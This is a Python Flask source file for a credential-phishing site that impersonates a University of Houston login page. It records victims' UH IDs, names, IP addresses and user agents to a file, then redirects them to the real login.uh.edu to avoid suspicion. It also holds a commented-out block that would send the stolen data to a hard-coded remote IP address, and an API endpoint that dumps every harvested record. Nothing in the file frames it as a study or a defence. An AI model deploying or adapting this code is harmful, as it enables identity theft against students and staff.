from flask import Flask, request, redirect, render_template, jsonify
from datetime import datetime
import requests
import os
import ast


app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        with open("creds/credentials.txt", "a") as f:
            f.write(f"{data}\n")

        # Optional: Exfiltrate to remote server
        """
        try:
            requests.post("http://170.187.138.68:5001/receive", json=data)
        except Exception as e:
            print("Failed to send data:", e)
        """

        return redirect("https://login.uh.edu")

    return render_template("login.html")


@app.route('/dashboard')
def dashboard():
    return render_template("dashboard.html")

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        with open(creds_file, "r") as f:
            for line in f:
                try:
                    entry = ast.literal_eval(line.strip())
                    entries.append(entry)
                except Exception:
                    continue
    return jsonify(entries)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'))
